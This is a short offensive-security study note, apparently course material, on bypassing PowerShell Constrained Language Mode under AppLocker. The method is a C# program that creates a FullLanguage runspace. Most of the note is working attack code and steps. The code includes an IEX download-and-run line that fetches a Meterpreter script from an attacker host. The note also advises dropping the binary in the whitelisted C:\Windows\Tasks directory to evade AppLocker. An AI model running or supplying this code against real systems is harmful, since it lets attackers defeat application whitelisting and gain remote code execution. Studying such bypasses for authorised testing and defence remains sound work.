# 07.04 PowerShell CLM Bypass Custom Runspace

> Section 8.3.2 · C# app creates FullLanguage runspace outside AppLocker

## Overview

When AppLocker enforces script rules, PowerShell runs in Constrained Language Mode (CLM) which blocks .NET calls and reflection. C# code in a whitelisted directory can create a custom PowerShell runspace (via System.Management.Automation.dll) that runs in FullLanguage mode — bypassing CLM.

## Steps

- **Add assembly reference** — `System.Management.Automation.dll` in Visual Studio.
- **Create runspace** — `RunspaceFactory.CreateRunspace(); runspace.Open()`.
- **Create PowerShell object** — `PowerShell.Create(); ps.Runspace = runspace`.
- **AddScript + Invoke** — pass arbitrary PS code; it runs in FullLanguage.
- **Copy to whitelisted dir** — executable must be in allowed path (e.g. C:\Windows\Tasks).

## Commands

### C# custom runspace (CLM bypass)

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

class RunspaceBypass {
    static void Main() {
        // Runs arbitrary PS in FullLanguage mode regardless of AppLocker CLM
        Runspace rs = RunspaceFactory.CreateRunspace();
        rs.Open();
        PowerShell ps = PowerShell.Create();
        ps.Runspace = rs;
        // Replace with your PS payload — e.g. download+run Meterpreter
        string cmd = "IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Meterpreter.ps1')";
        ps.AddScript(cmd);
        ps.Invoke();
        rs.Close();
    }
}
```

### Check CLM level

```powershell
$ExecutionContext.SessionState.LanguageMode
# FullLanguage  = unrestricted (admin context or outside CLM)
# ConstrainedLanguage = AppLocker script rules active
```
